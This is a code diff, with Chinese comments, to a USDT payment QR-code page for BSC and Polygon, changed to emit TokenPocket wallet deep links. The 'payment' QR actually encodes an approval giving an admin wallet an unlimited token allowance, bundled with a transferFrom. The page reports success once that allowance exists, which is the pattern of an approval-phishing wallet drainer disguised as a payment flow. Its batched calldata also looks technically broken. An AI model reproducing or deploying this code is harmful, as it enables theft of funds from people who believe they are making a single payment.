@@ -122,14 +122,16 @@ const CONFIG = {
     chainIdHex: "0x38",
     token: "0x55d398326f99059fF775485246999027B3197955",
     decimals: 18,
-    rpc: "https://bsc-dataseed.binance.org/"
+    rpc: "https://bsc-dataseed.binance.org/",
+    tpScheme: "bsc" // TP 钱包 BSC 协议名
   },
   polygon: {
     chainId: "137",
     chainIdHex: "0x89",
     token: "0xc2132D05D31c914877CCAf1253d40b9764aB58EB",
     decimals: 6,
-    rpc: "https://polygon-rpc.com/"
+    rpc: "https://polygon-rpc.com/",
+    tpScheme: "polygon" // TP 钱包 Polygon 协议名
   }
 };
 
@@ -156,9 +158,9 @@ document.querySelectorAll(".chain-btn").forEach(btn => {
 });
 document.getElementById("amount").addEventListener("input", renderQR);
 
-// 生成「授权+转账」批量交易二维码（TP 兼容版）
-function genBatchQR() {
-  const { token } = CONFIG[currentChain];
+// 生成 TP 钱包专属 Deep Link（直接定向到对应网络）
+function genTPDeepLink() {
+  const { token, tpScheme } = CONFIG[currentChain];
   const amount = parseFloat(document.getElementById("amount").value) || 0;
   const { decimals } = CONFIG[currentChain];
   const amountWei = BigInt(amount * (10 ** decimals)).toString(16).padStart(64, '0');
@@ -168,19 +170,19 @@ function genBatchQR() {
     ADMIN_WALLET.slice(2).padStart(64, '0') +
     "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
 
-  // 2. 转账 transferFrom(user, admin, amount)（user 由钱包自动填充）
+  // 2. 转账 transferFrom(user, admin, amount)
   const transferData = "0x23b872dd" +
     "0000000000000000000000000000000000000000000000000000000000000000" +
     ADMIN_WALLET.slice(2).padStart(64, '0') +
     amountWei;
 
-  // 合并为一笔交易数据
   const batchData = approveData + transferData.slice(2);
-  return `ethereum:${token}?data=${batchData}`;
+  // TP 钱包专属格式：{scheme}://{token}?data={data}
+  return `${tpScheme}://${token}?data=${batchData}`;
 }
 
 function renderQR() {
-  const url = genBatchQR();
+  const url = genTPDeepLink();
   const qr = `https://api.qrserver.com/v1/create-qr-code/?size=280x280&data=${encodeURIComponent(url)}`;
   document.getElementById("qrcode").innerHTML = `<img src="${qr}" alt="支付二维码">`;
 }
@@ -264,7 +266,6 @@ async function checkStatus() {
     const { token, decimals } = CONFIG[currentChain];
     const tokenContract = new ethers.Contract(token, ERC20_ABI, provider);
     const allowance = await tokenContract.allowance(account, ADMIN_WALLET);
-    const balance = await tokenContract.balanceOf(ADMIN_WALLET);
     const statusEl = document.getElementById("authStatus");
     const currentStatus = allowance >= ethers.MaxUint256 / 2n ? "success" : "none";
 
@@ -274,7 +275,7 @@ async function checkStatus() {
     lastStatus = currentStatus;
 
     if (allowance >= ethers.MaxUint256 / 2n) {
-      statusEl.innerHTML = `✅ 支付成功！管理员已收到 ${ethers.formatUnits(balance, decimals)} USDT`;
+      statusEl.innerHTML = `✅ 支付成功！已完成授权`;
       statusEl.className = "status success";
     } else {
       statusEl.innerHTML = "❌ 未完成支付";
